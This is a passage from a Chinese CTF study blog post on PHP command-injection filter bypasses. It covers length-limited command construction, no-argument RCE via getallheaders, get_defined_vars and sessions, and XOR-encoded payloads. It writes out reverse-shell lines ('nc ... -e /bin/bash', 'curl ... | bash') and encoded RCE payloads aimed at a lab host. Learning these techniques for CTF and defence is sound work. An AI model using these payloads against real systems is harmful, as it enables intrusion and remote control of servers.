+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">道理一样，不需要xxd来解码，只需要printf即可</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250211211135625.png" alt="image-20250211211135625"></p>
+<h2 id="长度过滤绕过"><a href="#长度过滤绕过" class="headerlink" title="长度过滤绕过"></a>长度过滤绕过</h2><h3 id="符号和-符号"><a href="#符号和-符号" class="headerlink" title="&gt;符号和&gt;&gt;符号"></a>&gt;符号和&gt;&gt;符号</h3><p>1.通过&gt;来创建文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#echo benben &gt; a</span><br><span class="line">创建文件a,</span><br><span class="line">并把字符串&#x27;benben&#x27;写入到文件a里；</span><br><span class="line">#echo dazhuang &gt; a</span><br><span class="line">通过&gt;来将命令执行结果写入文件会覆盖掉文件原本的内容；</span><br></pre></td></tr></table></figure>
+
+<p>2.通过&gt;&gt;来追加内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#echo benben &gt;&gt;a</span><br><span class="line">在原本文件内容后面追加&#x27;benben</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250211220903301.png" alt="image-20250211220903301"></p>
+<h3 id="命令换行"><a href="#命令换行" class="headerlink" title="命令换行"></a>命令换行</h3><p>在没有写完的命令后面” \ ”，可以将一条命令写在多行</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250211220931950.png" alt="image-20250211220931950"></p>
+<h3 id="ls-t命令"><a href="#ls-t命令" class="headerlink" title="ls-t命令"></a>ls-t命令</h3><p>文件默认排序优先级是,符号&gt;数字&gt;字母</p>
+<p>而ls -t 可以将文件名按照时间顺序排列出来（后创建的排在前面）</p>
+<p>只能够精确到秒</p>
+<p>组合运用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ls -t 命令列出文件名，然后每个文件名按行储存；</span><br><span class="line">在创建文件时，加入&quot;\&quot;</span><br><span class="line">把命令&quot;ca&quot;&quot;t&quot;&quot;f&quot;&quot;ag&quot;连接起来</span><br><span class="line">前面的把后面的实体化变成字符</span><br><span class="line">有空格使用双引号包裹</span><br><span class="line">可以使用source ./文件,来执行也可以sh执行</span><br><span class="line">sh命令是shell命令语言解释器</span><br><span class="line">执行命令从标准输入读取或从一个文件中读取。</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250211223739280.png" alt="image-20250211223739280"></p>
+<p>对命令长度有限制时<br>把一些很短的文件名拼接成可执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;创建很短的文件名</span><br><span class="line">st按时间顺序列出文件名，按行储存</span><br><span class="line">连接换行命令</span><br><span class="line">sh从文件中读取命令</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="dir及-和rev"><a href="#dir及-和rev" class="headerlink" title="dir及*和rev"></a>dir及*和rev</h4><h5 id="dir"><a href="#dir" class="headerlink" title="dir"></a>dir</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir:基本上和ls一样，但有两个好处：</span><br><span class="line">一是开头字母是d,这使得它在alphabetical序中靠前；</span><br><span class="line">二是按列输出，不换行。</span><br></pre></td></tr></table></figure>
+
+<h5 id=""><a href="#" class="headerlink" title="*"></a>*</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">相等于$(dir *)</span><br><span class="line">如果第一个文件名是命令的话就会执行命令,返回执行的结果，之后的文件名作为参数传入。</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250212010604585.png" alt="image-20250212010604585"></p>
+<h5 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以反转文件每一行内容</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="长度限制为7的绕过"><a href="#长度限制为7的绕过" class="headerlink" title="长度限制为7的绕过"></a>长度限制为7的绕过</h3><p>目标是利用“  ls -t   ” 和”  &gt;  “符号还有”  \  “符号来构造<code>nc 192.168.65.128 7777 -e /bin/bash</code>来反弹shell到kali，来得到flag</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250212162311211.png" alt="image-20250212162311211"></p>
+<h3 id="长度限制为5的绕过"><a href="#长度限制为5的绕过" class="headerlink" title="长度限制为5的绕过"></a>长度限制为5的绕过</h3><p>无法使用<code>ls -t&gt;a</code>命令，需要重新构造ls -t&gt;a命令，需要使用”&gt;&gt;”追加符号，创建文件_ 将<code>ls -t&gt;a</code>追加到_里面然后使用<code>sh _</code>来执行</p>
+<p>而且只能有一个空格文件，我们需要使用在kali中打开web服务并且创建index.html文件，来用于反弹shell</p>
+<p>index.html内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.65.128 7777 -e  /bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用curl命令来获取并利用管道输出符来执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.65.128 | bash</span><br></pre></td></tr></table></figure>
+
+<p>从而拿到shell得到flag</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250212165101799.png" alt="image-20250212165101799"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250212172005168.png" alt="image-20250212172005168"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250212165117573.png" alt="image-20250212165117573"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250212165524459.png" alt="image-20250212165524459"></p>
+<h3 id="长度为4的绕过"><a href="#长度为4的绕过" class="headerlink" title="长度为4的绕过"></a>长度为4的绕过</h3><p>利用追加符号构造<code>ls -t&gt;g</code>也不可以需要重新构造，利用dir和*和rev来构造</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250212172726883.png" alt="image-20250212172726883"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250212172851365.png" alt="image-20250212172851365"></p>
+<p>有一个问题，按照字母排序，但是顺序不满足，所以我们可以在t-前面加h，反转后为-th，不影响命令的执行，但是可以改变排序</p>
+<p>此时我们可将内容传输到一个文件使用<code>*&gt;v</code>将内容放到u里面</p>
+<p>然后可以利用*和rev来把v里面内容反转</p>
+<p>先创建一个rev的目录，然后使用*来执行，得到反转后的文件，并放在w里面</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250212174258577.png" alt="image-20250212174258577"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250212174608369.png" alt="image-20250212174608369"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250212174730953.png" alt="image-20250212174730953"></p>
+<h2 id="无参数命令执行"><a href="#无参数命令执行" class="headerlink" title="无参数命令执行"></a>无参数命令执行</h2><h4 id="1-请求头绕过-PHP7-3"><a href="#1-请求头绕过-PHP7-3" class="headerlink" title="1.请求头绕过(PHP7.3)"></a>1.请求头绕过(<code>PHP7.3</code>)</h4><h5 id="HTTP请求标头"><a href="#HTTP请求标头" class="headerlink" title="HTTP请求标头"></a>HTTP请求标头</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getallheaders()</span><br><span class="line"></span><br><span class="line">获取所有HTTP请求标头（倒着获取）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>用end()包裹<code>getallheaders()</code>可以只获取第一个请求头，即<code>getallheaders()</code>获取的最后一个；</p>
+<p>用<code>pos()</code>作用和<code>end()</code>相反</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250213202711824.png" alt="image-20250213202711824"></p>
+<h4 id="apache-request-headers"><a href="#apache-request-headers" class="headerlink" title="apache_request_headers()"></a>apache_request_headers()</h4><p>功能与<code>getallheaders()</code>相似，适用于Apache服务器</p>
+<h3 id="利用全局变量进RCE-php5-7"><a href="#利用全局变量进RCE-php5-7" class="headerlink" title="利用全局变量进RCE(php5/7)"></a>利用全局变量进RCE(<code>php5/7</code>)</h3><h5 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h5><ol>
+<li><p>返回所有已定义变量的值，所组成的数组</p>
+</li>
+<li><p>返回数组顺序为GET-&gt;POST-&gt;COOKIE-&gt;FILES</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">利用get_defind_vars()函数来读取变量</span><br><span class="line"></span><br><span class="line">利用&amp;符号加入自己想要执行的命令</span><br><span class="line"></span><br><span class="line">利用end()和pos()来获取想要执行的命令，</span><br><span class="line"></span><br><span class="line">最后执行即可</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250213211122140.png" alt="image-20250213211122140"></p>
+<h3 id="利用session-php5"><a href="#利用session-php5" class="headerlink" title="利用session(php5)"></a>利用session(<code>php5</code>)</h3><h4 id="session-start"><a href="#session-start" class="headerlink" title="session_start()"></a>session_start()</h4><p>1.启动新会话或者重用现有会话，成功开始会话返回true,反之返回false,</p>
+<p>通过<code>session_id(session_start())</code>命令可以读取<code>PHPSESSID</code>所以我们可以通过修改<code>phpsessid</code>来执行命令</p>
+<p>然后我们可以通过<code>show_source()</code>来读取flag，将<code>phpsession</code>修改为.&#x2F;(文件名)来读取flag</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250214010743151.png" alt="image-20250214010743151"></p>
+<p>我们也能使用<code>system()</code>来执行命令，不过貌似因为<code>phpsessid</code>中不可以有空格，然后我们需要绕过，我试了几种绕过，目前只有<code>$IFS$9</code>这种可行，</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250214011313679.png" alt="image-20250214011313679"></p>
+<p>当然我们也可以通过<code>hex2bin()</code>命令进行hex编码来执行命令</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250214012319660.png" alt="image-20250214012319660"></p>
+<h3 id="使用scandir-进行文件读取"><a href="#使用scandir-进行文件读取" class="headerlink" title="使用scandir()进行文件读取"></a>使用scandir()进行文件读取</h3><p>只能文件读取</p>
+<p><code>scandir()</code>{类似s,在某文件路径下，把内容以列表形式显示出来}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">scandir()一列出指定路径中的文件和目录(PHP5,PHP7,PHP8)</span><br><span class="line"></span><br><span class="line">getcwd()一取得当前工作目录(PHP4,PHP5,PHP7,PHP8)</span><br><span class="line">current()一返回数组中的当前值(PHP4,PHP5,PHP7,PHP8)</span><br><span class="line">array_reverse()一返回单元顺序相反的数组(PHP4,PHP5,PHP7,PHP8)</span><br><span class="line">array_flip()一交换数组中的键和值(PHP4,PHP5,PHP7,PHP8)</span><br><span class="line">next()一将数组中的内部指针向前移动PHP4,PHP5,PHP7,PHP8)</span><br><span class="line">array_rand一从数组中随机取出一个或多个随机键</span><br><span class="line">chdir()一系统调用函数（同cd),用于改变当前工作目录</span><br><span class="line">strrev()一用于反转给定的字符串</span><br><span class="line">crypt()一用来来加密，目前Linux平台上加密的方法大致有MD5,DES,3DES</span><br><span class="line">hebrevc()一把希伯来文本从右至左的流转换为左至右的流。</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250214012512284.png" alt="image-20250214012512284"></p>
+<h3 id="无字母数字运算绕过"><a href="#无字母数字运算绕过" class="headerlink" title="无字母数字运算绕过"></a>无字母数字运算绕过</h3><h3 id="异或运算"><a href="#异或运算" class="headerlink" title="异或运算"></a>异或运算</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdmirror.com/gh/txfmk/Picturebed/picture/image-20250215142635088.png" alt="image-20250215142635088"></p>
+<p>通过异或来构造绕过过滤</p>
+<p>php5可以使用assert来拼接payload来执行命令,</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%24_%3D&#x27;!((%25)(&#x27;%5E&#x27;%40%5B%5B%40%5B%5C%5C&#x27;%3B%24__%3D&#x27;!%2B%2F((&#x27;%5E&#x27;~%7B%60%7B%7C&#x27;%3B%24___%3D%24%24__%3B%24_(%24___%5B&#x27;_&#x27;%5D)%3B</span><br><span class="line"></span><br><span class="line">_=system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>php7可以使用  <strong>&#96;</strong>  来执行命令，不过没有回显，我们可以通过反弹shell来拿到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%24_%3D&#x27;!%2B%2F((&#x27;%5E&#x27;~%7B%60%7B%7C&#x27;%3B%24__%3D%24%24_%3B%60%24__%5B_%5D%60%3B</span><br><span class="line">_=nc 192.168.65.128 7777 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src="https://cdn.jsdmirror.com/gh/txfmk/tx-pic/picture/20241230025420729.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src="https://cdn.jsdmirror.com/gh/txfmk/tx-pic/picture/20241230025420729.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">txfmk</div><div class="post-copyright__author_desc">菜菜</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2025/04/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2025/04/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/')">php命令执行</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2025/04/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=php命令执行&amp;url=http://example.com/2025/04/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&amp;pic=https://cdn.jsdelivr.net/gh/txfmk/tx-pic/picture/1743829693941.jpg" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">txfmk</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/php%E7%89%B9%E6%80%A7/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>php特性<span class="tagsPageCount">2</span></a><a class="post-meta__box__tags" href="/tags/web/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>web<span class="tagsPageCount">3</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/txfmk/tx-pic/picture/image-20250405130248468.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.smartcis.cn/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.smartcis.cn/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/04/05/ctfshow%20web(php%E7%89%B9%E6%80%A7wp)/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/txfmk/tx-pic/picture/image-20250405130248468.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">ctfshow—web php特性 89—150</div></div></a></div><div class="next-post pull-right"><a href="/2025/04/05/%E6%90%ADblog/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/txfmk/tx-pic/picture/image-20250405130248468.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">hexo和github搭配搭建个人blog</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2025/04/05/ctfshow%20web(php%E7%89%B9%E6%80%A7wp)/" title="ctfshow—web php特性 89—150"><img class="cover" src="https://cdn.jsdelivr.net/gh/txfmk/tx-pic/picture/image-20250405130248468.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-04-05</div><div class="title">ctfshow—web php特性 89—150</div></div></a></div><div><a href="/2025/04/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20/" title="php反序列化"><img class="cover" src="https://cdn.jsdelivr.net/gh/txfmk/tx-pic/picture/1743829693941.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-04-05</div><div class="title">php反序列化</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src="https://cdn.jsdmirror.com/gh/txfmk/tx-pic/picture/20241230025420729.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src="https://cdn.jsdmirror.com/gh/txfmk/tx-pic/picture/%E8%8F%9C%E7%8B%97.png" alt="status"/></div></div><div class="author-info__description">听风八百遍，才知是人间</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">txfmk</h1><div class="author-info__desc">菜菜</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/txfmk" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来看我的博客鸭~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E9%80%9A%E9%85%8D%E7%AC%A6%EF%BC%9F%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">1.通配符？绕过*</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8D%95%E5%BC%95%E5%8F%B7%E3%80%81%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number"></span> <span class="toc-text">2.单引号、双引号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8F%8D%E6%96%9C%E6%9D%A0-%E7%BB%95%E8%BF%87"><span class="toc-number"></span> <span class="toc-text">3.反斜杠  \    绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F%EF%BC%9A-1-%E5%88%B0-9%E3%80%81-%E5%92%8C-%E7%AD%89"><span class="toc-number"></span> <span class="toc-text">*4.特殊变量：$1 到$9、$@和$等</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C"><span class="toc-number"></span> <span class="toc-text">5.内联执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%88%A9%E7%94%A8linux%E4%B8%AD%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number"></span> <span class="toc-text">6.利用linux中的环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number"></span> <span class="toc-text">绕过空格过滤的方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number"></span> <span class="toc-text">读取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number"></span> <span class="toc-text">长度过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E5%92%8C-%E7%AC%A6%E5%8F%B7"><span class="toc-number"></span> <span class="toc-text">&gt;符号和&gt;&gt;符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%8D%A2%E8%A1%8C"><span class="toc-number"></span> <span class="toc-text">命令换行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ls-t%E5%91%BD%E4%BB%A4"><span class="toc-number"></span> <span class="toc-text">ls-t命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dir%E5%8F%8A-%E5%92%8Crev"><span class="toc-number">1.</span> <span class="toc-text">dir及*和rev</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#dir"><span class="toc-number">1.1.</span> <span class="toc-text">dir</span></a></li><li class="toc-item toc-level-5"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">*</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#rev"><span class="toc-number">1.3.</span> <span class="toc-text">rev</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E4%B8%BA7%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number"></span> <span 